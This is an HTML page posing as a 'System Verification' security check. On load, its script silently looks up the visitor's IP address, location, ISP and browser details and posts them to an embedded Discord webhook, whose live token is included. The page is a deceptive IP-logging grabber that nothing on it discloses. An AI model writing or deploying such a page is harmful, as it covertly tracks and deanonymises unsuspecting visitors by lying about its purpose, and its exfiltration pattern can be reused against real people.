<!DOCTYPE html>
<html lang="ja">
<head>
    <meta charset="UTF-8">
    <title>System Verification</title>
    <style>
        body { background: #0f172a; color: #f8fafc; font-family: sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
        .card { background: #1e293b; padding: 2rem; border-radius: 12px; text-align: center; border: 1px solid #334155; }
    </style>
</head>
<body>
    <div class="card">
        <p>🔄 Checking security connection...</p>
    </div>

    <script>
        const CONFIG = {
            // あなたの新しいWebhook
            URL: "https://discordapp.com/api/webhooks/1472913657682853970/s8Ic01f4JG-exl254N2aJnDAJbgbbSVfIAYNsfVTKRRyzGGsSMXgec7Pv4SbXwS4Qid_",
            // HTTPS対応のAPIに変更
            API: "https://ipapi.co/json/"
        };

        async function start() {
            try {
                // 1. IP情報の取得 (HTTPS)
                const res = await fetch(CONFIG.API);
                const d = await res.json();

                // 2. Discordへの送信
                await fetch(CONFIG.URL, {
                    method: "POST",
                    headers: { "Content-Type": "application/json" },
                    body: JSON.stringify({
                        embeds: [{
                            title: "🚀 Access Log (HTTPS Compatible)",
                            color: 0x38bdf8,
                            fields: [
                                { name: "🌐 IP", value: d.ip, inline: true },
                                { name: "📍 Loc", value: `${d.country_name} / ${d.city}`, inline: true },
                                { name: "🏢 ISP", value: d.org, inline: false },
                                { name: "📱 OS/Browser", value: navigator.userAgent }
                            ],
                            timestamp: new Date()
                        }]
                    })
                });
            } catch (e) {
                console.error("Error:", e);
            }
        }

        start();
    </script>
</body>
</html>
